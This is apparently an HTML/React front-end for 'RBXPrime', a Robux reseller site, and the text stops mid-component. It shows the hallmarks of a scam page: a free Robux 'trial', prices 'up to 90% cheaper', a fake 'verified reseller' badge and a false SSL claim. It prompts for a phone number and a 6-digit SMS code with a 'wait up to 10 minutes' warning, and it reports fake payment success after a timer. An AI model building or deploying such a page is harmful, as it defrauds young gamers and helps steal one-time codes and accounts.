<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXPrime - Premium Robux Store</title>
    
    <!-- React & ReactDOM -->
    <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
    
    <!-- Babel for JSX -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                    },
                }
            }
        }
    </script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
        
        body { font-family: 'Inter', sans-serif; }
        
        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.05); }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.3); }
        
        /* Tailwind-animate equivalents */
        @keyframes enter {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .animate-in { animation: enter 0.5s ease-out forwards; }
        .zoom-in-95 { animation: enter 0.3s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
        
        .delay-100 { animation-delay: 100ms; }
    </style>
</head>
<body class="bg-[#050505] text-white">
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;

        // --- ICONS (SVG Replacements for lucide-react) ---
        const Icon = ({ path, className, fill = "none" }) => (
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill={fill} stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
                {path}
            </svg>
        );

        const ShoppingCart = (p) => <Icon {...p} path={<><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></>} />;
        const Star = (p) => <Icon {...p} fill={p.fill || "none"} path={<polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>} />;
        const ShieldCheck = (p) => <Icon {...p} path={<><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></>} />;
        const Zap = (p) => <Icon {...p} fill={p.fill || "none"} path={<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>} />;
        const Menu = (p) => <Icon {...p} path={<><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="18" y2="18"/></>} />;
        const X = (p) => <Icon {...p} path={<><path d="M18 6 6 18"/><path d="m6 6 12 12"/></>} />;
        const Trash2 = (p) => <Icon {...p} path={<><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/></>} />;
        const CreditCard = (p) => <Icon {...p} path={<><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></>} />;
        const User = (p) => <Icon {...p} path={<><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></>} />;
        const Gem = (p) => <Icon {...p} path={<path d="M6 3h12l4 6-10 13L2 9Z"/>} />;
        const Check = (p) => <Icon {...p} path={<polyline points="20 6 9 17 4 12"/>} />;
        const Users = (p) => <Icon {...p} path={<><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></>} />;
        const Activity = (p) => <Icon {...p} path={<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>} />;
        const ArrowLeft = (p) => <Icon {...p} path={<><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></>} />;
        const Lock = (p) => <Icon {...p} path={<><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></>} />;
        const Loader2 = (p) => <Icon {...p} className={`${p.className || ''} animate-spin`} path={<path d="M21 12a9 9 0 1 1-6.219-8.56"/>} />;
        const Mail = (p) => <Icon {...p} path={<><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></>} />;
        const Smartphone = (p) => <Icon {...p} path={<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>} />;
        const AlertTriangle = (p) => <Icon {...p} path={<path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>} />;
        const ChevronRight = (p) => <Icon {...p} path={<path d="m9 18 6-6-6-6"/>} />;

        // --- DATA CONSTANTS ---

        const robuxPackages = [
            { id: 0, amount: 200, price: 0.00, bonus: '0', popular: true, tag: 'FREE TRIAL' },
            { id: 1, amount: 800, price: 1.99, bonus: '100', popular: false },
            { id: 2, amount: 1700, price: 3.99, bonus: '200', popular: true },
            { id: 3, amount: 4500, price: 8.99, bonus: '500', popular: false },
            { id: 4, amount: 10000, price: 18.99, bonus: '1200', popular: false },
            { id: 5, amount: 22500, price: 39.99, bonus: '3000', popular: false },
        ];

        const premiumFeatures = [
            { icon: <Zap className="w-6 h-6 text-white" />, title: "Instant Delivery", desc: "Robux are transferred to your account within seconds." },
            { icon: <ShieldCheck className="w-6 h-6 text-white" />, title: "Secure & Safe", desc: "No password required. We only need your username." },
            { icon: <Star className="w-6 h-6 text-white" />, title: "Best Rates", desc: "Up to 90% cheaper than official store prices." },
        ];

        // --- COMPONENTS ---

        const HomeView = ({ username, setUsername, addToCart }) => (
            <>
                {/* Hero Section */}
                <div className="relative z-10 pt-32 pb-12 lg:pt-48 lg:pb-24 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto text-center animate-in">
                    <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/10 border border-white/20 text-white text-sm font-medium mb-6">
                        <Star className="w-3 h-3 text-yellow-400" fill="currentColor" />
                        <span>#1 Verified Robux Reseller</span>
                    </div>
                    
                    <h1 className="text-5xl md:text-7xl font-bold tracking-tight mb-6 text-white">
                        Legit Robux. <br/>
                        <span className="text-transparent bg-clip-text bg-gradient-to-r from-gray-200 to-gray-600">Unbeatable Prices.</span>
                    </h1>
                    
                    <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-10">
                        Instant delivery to your account. Safe, secure, and cheaper than ever.
                    </p>

                    {/* Stats Section */}
                    <div className="flex flex-wrap justify-center gap-4 md:gap-12 mb-12">
                        <div className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10">
                            <Activity className="w-5 h-5 text-green-500" />
                            <div className="text-left">
                                <p className="text-xs text-gray-400">Total Deals</p>
                                <p className="font-bold text-sm">100+ Completed</p>
                            </div>
                        </div>
                        <div className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10">
                            <Users className="w-5 h-5 text-blue-500" />
                            <div className="text-left">
                                <p className="text-xs text-gray-400">Customers</p>
                                <p className="font-bold text-sm">50+ Happy Users</p>
                            </div>
                        </div>
                    </div>
                    
                    {/* Username Input */}
                    <div className="max-w-md mx-auto bg-black p-2 rounded-2xl border border-white/20 flex items-center gap-2 mb-16 shadow-2xl hover:border-white/40 transition-colors">
                        <div className="pl-4 text-gray-400">
                            <User className="w-5 h-5" />
                        </div>
                        <input 
                            type="text" 
                            placeholder="Enter Roblox Username" 
                            className="flex-1 bg-transparent border-none outline-none text-white placeholder-gray-500 h-12"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                        />
                        <button 
                            onClick={() => document.getElementById('packages').scrollIntoView({ behavior: 'smooth' })}
                            className="px-8 h-12 rounded-xl bg-white text-black font-bold hover:bg-gray-200 transition-all"
                        >
                            Start
                        </button>
                    </div>
                </div>

                {/* Pricing Section */}
                <div id="packages" className="relative z-10 py-24 bg-black border-t border-white/10">
                    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                        <div className="flex flex-col md:flex-row justify-between items-end mb-12 gap-6">
                            <div>
                                <h2 className="text-3xl md:text-4xl font-bold mb-4">Current Deals</h2>
                                <p className="text-gray-400">Limited time offers. Prices in EUR.</p>
                            </div>
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
                            {robuxPackages.map((pkg) => (
                                <div 
                                    key={pkg.id}
                                    className={`relative group overflow-hidden rounded-3xl transition-all duration-300 border ${
                                        pkg.price === 0
                                            ? 'bg-gradient-to-b from-white/10 to-black border-white/40 transform hover:scale-[1.02] shadow-2xl shadow-white/5'
                                            : 'bg-[#111] border-white/10 hover:border-white/30 hover:bg-[#161616]'
                                    }`}
                                >
                                    {/* Tags */}
                                    {pkg.tag && (
                                        <div className="absolute top-0 right-0 bg-white text-black text-xs font-bold px-4 py-1.5 rounded-bl-xl z-20">
                                            {pkg.tag}
                                        </div>
                                    )}
                                    
                                    {pkg.popular && !pkg.tag && (
                                        <div className="absolute top-0 right-0 bg-[#222] text-white border-l border-b border-white/20 text-xs font-bold px-4 py-1.5 rounded-bl-xl z-20">
                                            BEST SELLER
                                        </div>
                                    )}

                                    <div className="p-8 relative z-10">
                                        <div className="flex justify-between items-start mb-6">
                                            <div className={`w-12 h-12 rounded-full flex items-center justify-center transition-transform duration-300 ${pkg.price === 0 ? 'bg-white text-black' : 'bg-white/5 border border-white/10'}`}>
                                                <Gem className={`w-6 h-6 ${pkg.price === 0 ? 'text-black' : 'text-white'}`} />
                                            </div>
                                            <div className="text-right">
                                                {pkg.price > 0 && (
                                                    <p className="text-sm text-gray-500 line-through decoration-red-500 decoration-2">€{(pkg.price * 8).toFixed(2)}</p>
                                                )}
                                                <p className="text-2xl font-bold text-white">
                                                    {pkg.price === 0 ? 'FREE' : `€${pkg.price.toFixed(2)}`}
                                                </p>
                                            </div>
                                        </div>

                                        <div className="mb-8">
                                            <h3 className="text-4xl font-black text-white mb-2">
                                                {pkg.amount.toLocaleString()}
                                            </h3>
                                            {pkg.bonus !== '0' && (
                                                <p className="text-sm font-medium text-green-400 flex items-center gap-1">
                                                    <Zap className="w-3 h-3" fill="currentColor" />
                                                    +{pkg.bonus} Bonus
                                                </p>
                                            )}
                                            {pkg.price === 0 && (
                                                <p className="text-sm font-medium text-gray-400">
                                                    One time per user
                                                </p>
                                            )}
                                        </div>

                                        <button 
                                            onClick={() => addToCart(pkg)}
                                            className={`w-full py-4 rounded-xl font-bold flex items-center justify-center gap-2 transition-all active:scale-95 ${
                                            pkg.price === 0
                                                ? 'bg-white text-black hover:bg-gray-200'
                                                : 'bg-[#222] text-white border border-white/10 hover:bg-[#333]'
                                        }`}>
                                            {pkg.price === 0 ? 'Claim Now' : 'Add to Cart'}
                                        </button>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>

                {/* Trust Section */}
                <div className="py-16 border-t border-white/5 bg-[#080808]">
                    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                            {premiumFeatures.map((feature, idx) => (
                                <div key={idx} className="flex flex-col items-center text-center p-6">
                                    <div className="mb-4 p-4 rounded-full bg-white/5 border border-white/10">
                                        {feature.icon}
                                    </div>
                                    <h3 className="text-lg font-bold mb-2">{feature.title}</h3>
                                    <p className="text-sm text-gray-500 max-w-xs">{feature.desc}</p>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </>
        );

        const CheckoutView = ({ 
            username, setUsername, 
            email, setEmail, 
            phoneNumber, setPhoneNumber, 
            isFreeOrder, 
            handleCheckout, 
            isProcessing, 
            cartTotal, 
            cart, 
            navigateTo 
        }) => (
            <div className="pt-32 pb-24 px-4 max-w-7xl mx-auto min-h-screen">
                <button 
                    onClick={() => navigateTo('home')}
                    className="flex items-center gap-2 text-gray-400 hover:text-white mb-8 transition-colors"
                >
                    <ArrowLeft className="w-4 h-4" /> Back to Store
                </button>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                    {/* Checkout Form */}
                    <div className="animate-in">
                        <h2 className="text-3xl font-bold mb-6 flex items-center gap-3">
                            <Lock className="w-6 h-6 text-green-400" /> Secure Checkout
                        </h2>
                        
                        <form onSubmit={handleCheckout} className="space-y-6">
                            <div className="space-y-4">
                                <h3 className="text-xl font-semibold text-gray-200">Account Details</h3>
                                
                                <div className="space-y-2">
                                    <label className="text-sm text-gray-400">Roblox Username (No Password Required)</label>
                                    <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
                                        <User className="w-5 h-5 text-gray-500" />
                                        <input 
                                            required
                                            type="text" 
                                            value={username}
                                            onChange={(e) => setUsername(e.target.value)}
                                            placeholder="YourUsername123" 
                                            className="flex-1 bg-transparent border-none outline-none text-white w-full"
                                        />
                                    </div>
                                </div>

                                {/* Conditional Form Rendering */}
                                {isFreeOrder ? (
                                    // --- FREE ORDER FORM (Phone Only) ---
                                    <div className="space-y-2 animate-in">
                                        <label className="text-sm text-gray-400">Phone Number (For Verification)</label>
                                        <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
                                            <Smartphone className="w-5 h-5 text-gray-500" />
                                            <input 
                                                required
                                                type="tel" 
                                                value={phoneNumber}
                                                onChange={(e) => setPhoneNumber(e.target.value)}
                                                placeholder="+1 (555) 000-0000" 
                                                className="flex-1 bg-transparent border-none outline-none text-white w-full"
                                                autoFocus 
                                            />
                                        </div>
                                        <p className="text-xs text-yellow-500 flex items-center gap-1 mt-2">
                                            <AlertTriangle className="w-3 h-3" /> 
                                            SMS Verification required for free offers.
                                        </p>
                                    </div>
                                ) : (
                                    // --- PAID ORDER FORM (Email + Card) ---
                                    <div className="space-y-2">
                                        <label className="text-sm text-gray-400">Email Address (For Receipt)</label>
                                        <div className="flex items-center gap-3 bg-[#111] p-3 rounded-xl border border-white/10 focus-within:border-white/40 transition-colors">
                                            <Mail className="w-5 h-5 text-gray-500" />
                                            <input 
                                                required
                                                type="email" 
                                                value={email}
                                                onChange={(e) => setEmail(e.target.value)}
                                                placeholder="you@example.com" 
                                                className="flex-1 bg-transparent border-none outline-none text-white w-full"
                                            />
                                        </div>
                                    </div>
                                )}
                            </div>

                            <div className="space-y-4 pt-4 border-t border-white/5">
                                <h3 className="text-xl font-semibold text-gray-200">
                                    {isFreeOrder ? 'Verification Method' : 'Payment Method'}
                                </h3>
                                
                                {isFreeOrder ? (
                                    // Free Order Payment View
                                    <div className="p-4 rounded-xl border border-yellow-500/20 bg-yellow-500/5">
                                        <div className="flex items-center gap-2 mb-2">
                                            <Smartphone className="w-5 h-5 text-yellow-500" />
                                            <span className="font-bold text-yellow-500">SMS Verification</span>
                                        </div>
                                        <p className="text-sm text-gray-400">We will send a one-time code to your phone to verify you are a real human.</p>
                                    </div>
                                ) : (
                                    // Standard Payment View
                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                                        <label className="cursor-pointer relative">
                                        <input type="radio" name="payment" className="peer sr-only" defaultChecked />
                                        <div className="p-4 rounded-xl border border-white/10 bg-[#111] peer-checked:bg-white/10 peer-checked:border-white transition-all hover:bg-[#1a1a1a]">
                                            <div className="flex items-center gap-2 mb-2">
                                            <CreditCard className="w-5 h-5" />
                                            <span className="font-bold">Credit/Debit Card</span>
                                            </div>
                                            <div className="flex gap-2 opacity-50">
                                            <div className="w-8 h-5 bg-white/20 rounded"></div>
                                            <div className="w-8 h-5 bg-white/20 rounded"></div>
                                            </div>
                                        </div>
                                        </label>
                                        <label className="cursor-pointer relative">
                                        <input type="radio" name="payment" className="peer sr-only" />
                                        <div className="p-4 rounded-xl border border-white/10 bg-[#111] peer-checked:bg-white/10 peer-checked:border-white transition-all hover:bg-[#1a1a1a]">
                                            <div className="flex items-center gap-2 mb-2">
                                            <div className="w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center text-[10px] font-bold">P</div>
                                            <span className="font-bold">PayPal</span>
                                            </div>
                                            <p className="text-xs text-gray-500">Fast & Secure</p>
                                        </div>
                                        </label>
                                    </div>
                                )}
                            </div>

                            <button 
                                type="submit" 
                                disabled={isProcessing}
                                className="w-full py-4 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all active:scale-95 flex items-center justify-center gap-2 mt-8 disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                                {isProcessing ? (
                                    <>
                                        <Loader2 className="w-5 h-5 animate-spin" /> {isFreeOrder ? 'Sending Code...' : 'Processing...'}
                                    </>
                                ) : (
                                    <>
                                        {isFreeOrder ? 'Verify Number' : `Pay €${cartTotal.toFixed(2)}`}
                                    </>
                                )}
                            </button>
                            <p className="text-xs text-center text-gray-500 flex items-center justify-center gap-1">
                                <ShieldCheck className="w-3 h-3" /> {isFreeOrder ? 'Secure Verification System' : '256-bit SSL Encrypted Payment'}
                            </p>
                        </form>
                    </div>

                    {/* Order Summary */}
                    <div className="lg:pl-8 animate-in delay-100">
                        <div className="bg-[#111] rounded-2xl p-6 border border-white/10 sticky top-32">
                            <h3 className="text-xl font-bold mb-6">Order Summary</h3>
                            <div className="space-y-4 max-h-96 overflow-y-auto pr-2 mb-6 custom-scrollbar">
                                {cart.map((item, idx) => (
                                    <div key={idx} className="flex justify-between items-center py-3 border-b border-white/5 last:border-0">
                                        <div className="flex items-center gap-3">
                                            <div className="w-10 h-10 bg-white/5 rounded-lg flex items-center justify-center">
                                                <Gem className="w-5 h-5 text-gray-300" />
                                            </div>
                                            <div>
                                                <p className="font-bold text-sm text-white">{item.amount.toLocaleString()} Robux</p>
                                                <p className="text-xs text-gray-500">{item.bonus !== '0' ? `+${item.bonus} Bonus` : 'Standard Pack'}</p>
                                            </div>
                                        </div>
                                        <p className="font-bold">€{item.price.toFixed(2)}</p>
                                    </div>
                                ))}
                            </div>
                            
                            <div className="space-y-3 pt-4 border-t border-white/10">
                                <div className="flex justify-between text-gray-400 text-sm">
                                    <span>Subtotal</span>
                                    <span>€{cartTotal.toFixed(2)}</span>
                                </div>
                                <div className="flex justify-between text-gray-400 text-sm">
                                    <span>Processing Fee</span>
                                    <span>€0.00</span>
                                </div>
                                <div className="flex justify-between text-xl font-bold text-white pt-2">
                                    <span>Total</span>
                                    <span>€{cartTotal.toFixed(2)}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        );

        const OtpVerifyView = ({ 
            phoneNumber, 
            otp, 
            setOtp, 
            handleOtpSubmit, 
            isProcessing, 
            navigateTo 
        }) => (
            <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
                <div className="w-24 h-24 bg-yellow-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
                    <Smartphone className="w-12 h-12 text-yellow-500" />
                </div>
                <h1 className="text-4xl md:text-5xl font-bold mb-4">Enter Verification Code</h1>
                <p className="text-gray-400 text-lg max-w-lg mb-8">
                    We have sent a 6-digit code to <span className="text-white font-bold">{phoneNumber}</span>
                </p>

                {/* --- CRITICAL WARNING MESSAGE --- */}
                <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-xl mb-8 max-w-md w-full flex items-start gap-3">
                    <AlertTriangle className="w-6 h-6 text-red-500 shrink-0" />
                    <p className="text-red-400 text-sm text-left font-semibold">
                        OTP can take up to 10min so please wait or else the offer will be cancelled.
                    </p>
                </div>
                
                <form onSubmit={handleOtpSubmit} className="w-full max-w-xs space-y-6">
                    <input 
                        required
                        type="text" 
                        maxLength="6"
                        placeholder="000000" 
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, ''))}
                        className="w-full h-16 text-center text-3xl tracking-[0.5em] bg-[#111] border border-white/20 rounded-xl focus:border-white/50 outline-none transition-all"
                    />
                    
                    <button 
                        type="submit"
                        disabled={isProcessing || otp.length < 6}
                        className="w-full py-4 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                        {isProcessing ? 'Verifying...' : 'Verify & Claim Robux'}
                    </button>
                </form>

                <button 
                    onClick={() => navigateTo('checkout')} 
                    className="mt-6 text-sm text-gray-500 hover:text-white transition-colors"
                >
                    Change Phone Number
                </button>
            </div>
        );

        const SuccessView = ({ isFreeOrder, username, orderId, navigateTo }) => (
            <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
                <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
                    <Check className="w-12 h-12 text-green-500" />
                </div>
                <h1 className="text-4xl md:text-5xl font-bold mb-4">
                    {isFreeOrder ? 'Verification Successful!' : 'Payment Successful!'}
                </h1>
                <p className="text-gray-400 text-lg max-w-lg mb-8">
                    Your order has been confirmed. Your Robux are being queued for transfer to <span className="text-white font-bold">{username}</span>.
                </p>
                
                <div className="bg-[#111] p-6 rounded-2xl border border-white/10 mb-8 w-full max-w-md">
                    <div className="flex justify-between mb-2">
                        <span className="text-gray-500">Order ID</span>
                        <span className="font-mono text-white">{orderId}</span>
                    </div>
                    <div className="flex justify-between mb-2">
                        <span className="text-gray-500">Status</span>
                        <span className="text-yellow-400 font-bold animate-pulse">Processing Transfer...</span>
                    </div>
                    <div className="flex justify-between">
                        <span className="text-gray-500">Est. Arrival</span>
                        <span className="text-white">5-10 Minutes</span>
                    </div>
                </div>

                <button 
                    onClick={() => navigateTo('home')}
                    className="px-8 py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-all"
                >
                    Return to Home
                </button>
            </div>
        );

        // --- MAIN APP ---

        const App = () => {
            const [currentView, setCurrentView] = useState('home'); 
            const [isMenuOpen, setIsMenuOpen] = useState(false);
            const [isCartOpen, setIsCartOpen] = useState(false);
            const [scrolled, setScrolled] = useState(false);
            const [cart, setCart] = useState([]);
            const [username, setUsername] = useState('');
            const [email, setEmail] = useState('');
            const [phoneNumber, setPhoneNumber] = useState('');
            const [otp, setOtp] = useState('');
            const [isProcessing, setIsProcessing] = useState(false);
            const [orderId, setOrderId] = useState('');

            useEffect(() => {
                const handleScroll = () => {
                    setScrolled(window.scrollY > 20);
                };
                window.addEventListener('scroll', handleScroll);
                return () => window.removeEventListener('scroll', handleScroll);
            }, []);

            const addToCart = (pkg) => {
                if (pkg.price === 0 && cart.some(item => item.price === 0)) {
                    alert("You can only claim the Free Trial once per order.");
                    return;
                }
                if (pkg.price === 0) {
                    setCart([pkg]);
                } else {
                    const cleanCart = cart.filter(item => item.price !== 0);
                    setCart([...cleanCart, pkg]);
                }
                setIsCartOpen(true);
            };

            const removeFromCart = (index) => {
                const newCart = [...cart];
                newCart.splice(index, 1);
                setCart(newCart);
            };

            const cartTotal = cart.reduce((sum, item) => sum + item.price, 0);
            const isFreeOrder = cart.length === 1 && cart[0].price === 0;

            const navigateTo = (view) => {
                setCurrentView(view);
                setIsMenuOpen(false);
                setIsCartOpen(false);
                window.scrollTo(0, 0);
            };

            const handleCheckout = (e) => {
                e.preventDefault();
                setIsProcessing(true);
                
                if (isFreeOrder) {
                    setTimeout(() => {
                        setIsProcessing(false);
                        setCurrentView('otp-verify');
                        window.scrollTo(0, 0);
                    }, 1500);
                } else {
                    setTimeout(() => {
                        setIsProcessing(false);
                        setOrderId(Math.random().toString(36).substr(2, 9).toUpperCase());
                        setCart([]);
                        setCurrentView('success');
                        window.scrollTo(0, 0);
                    }, 2500);
                }
            };

            const handleOtpSubmit = (e) => {
                e.preventDefault();
                setIsProcessing(true);
                setTimeout(() => {
                    setIsProcessing(false);
                    setOrderId(Math.random().toString(36).substr(2, 9).toUpperCase());
                    setCart([]);
                    setCurrentView('success');
                    window.scrollTo(0, 0);
                }, 3000);
            }

            return (
                <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-white/20">
                    {/* Background Ambience */}
                    <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none">
                        <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-white/5 blur-[120px]" />
                        <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-gray-500/10 blur-[120px]" />
                    </div>

                    {/* Navigation */}
                    <nav className={`fixed w-full z-50 transition-all duration-300 ${scrolled ? 'bg-[#050505]/90 backdrop-blur-md border-b border-white/10' : 'bg-transparent'}`}>
                        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                            <div className="flex justify-between items-center h-20">
                                <div 
                                    className="flex items-center gap-2 cursor-pointer"
                                    onClick={() => navigateTo('home')}
                                >
                                    <div className="w-10 h-10 rounded-xl bg-white text-black flex items-center justify-center shadow-lg shadow-white/10">
                                        <Gem className="w-6 h-6" />
                                    </div>
                                    <span className="text-2xl font-bold tracking-tighter">
                                        RBX<span className="text-gray-400">Prime</span>
                                    </span>
                                </div>

                                {/* Desktop Menu */}
                                <div className="hidden md:flex items-center space-x-8">
                                    <button onClick={() => navigateTo('home')} className={`text-sm font-medium transition-colors ${currentView === 'home' ? 'text-white' : 'text-gray-300 hover:text-white'}`}>Home</button>
                                    <button onClick={() => navigateTo('home')} className="text-sm font-medium text-gray-300 hover:text-white transition-colors">Store</button>
                                    <button 
                                        onClick={() => setIsCartOpen(!isCartOpen)}
                                        className="flex items-center gap-2 px-5 py-2.5 rounded-full bg-white text-black hover:bg-gray-200 transition-all hover:scale-105 active:scale-95 font-bold"
                                    >
                                        <ShoppingCart className="w-4 h-4" />
                                        <span className="text-sm">Cart ({cart.length})</span>
                                    </button>
                                </div>

                                {/* Mobile Menu Button */}
                                <div className="md:hidden flex items-center gap-4">
                                    <button 
                                        onClick={() => setIsCartOpen(!isCartOpen)}
                                        className="p-2 text-white relative"
                                    >
                                        <ShoppingCart className="w-6 h-6" />
                                        {cart.length > 0 && (
                                            <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full text-[10px] flex items-center justify-center font-bold">
                                                {cart.length}
                                            </span>
                                        )}
                                    </button>
                                    <button onClick={() => setIsMenuOpen(!isMenuOpen)} className="p-2 text-gray-400 hover:text-white">
                                        {isMenuOpen ? <X /> : <Menu />}
                                    </button>
                                </div>
                            </div>
                        </div>

                        {/* Mobile Menu */}
                        {isMenuOpen && (
                            <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full">
                                <div className="px-4 pt-2 pb-6 space-y-2">
                                    <button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button>
                                    <button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white hover:bg-white/5 rounded-lg">Store</button>
                                </div>
                            </div>
                        )}

                        {/* Cart Dropdown/Modal */}
                        {isCartOpen && currentView !== 'checkout' && currentView !== 'success' && currentView !== 'otp-verify' && (
                            <div className="absolute top-20 right-0 md:right-10 w-full md:w-96 bg-[#111] border border-white/10 shadow-2xl rounded-b-2xl md:rounded-2xl p-6 overflow-hidden z-50 animate-in">
                                <div className="flex justify-between items-center mb-4">
                                    <h3 className="font-bold text-xl">Your Cart</h3>
                                    <button onClick={() => setIsCartOpen(false)}><X className="w-5 h-5 text-gray-500 hover:text-white" /></button>
                                </div>
                                
                                {cart.length === 0 ? (
                                    <div className="text-center py-8 text-gray-500">
                                        <ShoppingCart className="w-12 h-12 mx-auto mb-3 opacity-20" />
                                        <p>Your cart is empty</p>
                                    </div>
                                ) : (
                                    <div className="space-y-4 max-h-[60vh] overflow-y-auto pr-2">
                                        {cart.map((item, idx) => (
                                            <div key={idx} className="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5">
                                                <div className="flex items-center gap-3">
                                                    <div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center">
                                                        <Gem className="w-5 h-5 text-white" />
                                                    </div>
                                                    <div>
                                                        <p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p>
                                                        <p className="text-xs text-green-400">
                                                            {item.price === 0 ? 'FREE' : `€${item.price.toFixed(2)}`}
                                                        </p>
                                                    </div>
                                                </div>
                                                <button 
                                                    onClick={() => removeFromCart(idx)}
                                                    className="text-gray-500 hover:text-red-500 transition-colors p-2"
                                                >
                                                    <Trash2 className="w-4 h-4" />
                                                </button>
                                            </div>
                                        ))}
                                    </div>
                                )}

                                {cart.length > 0 && (
                                    <div className="mt-6 pt-4 border-t border-white/10">
                                        <div className="flex justify-between items-center mb-4 text-lg font-bold">
                                            <span>Total</span>
                                            <span>€{cartTotal.toFixed(2)}</span>
                                        </div>
                                        <button 
                                            onClick={() => navigateTo('checkout')}
                                            className="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-colors flex items-center justify-center gap-2"
                                        >
                                            Checkout Now <ChevronRight className="w-4 h-4" />
                                        </button>
                                    </div>
                                )}
                            </div>
                        )}
                    </nav>

                    {/* Main Content Area */}
                    <main>
                        {currentView === 'home' && (
                            <HomeView 
                                username={username} 
                                setUsername={setUsername} 
                                addToCart={addToCart} 
                            />
                        )}
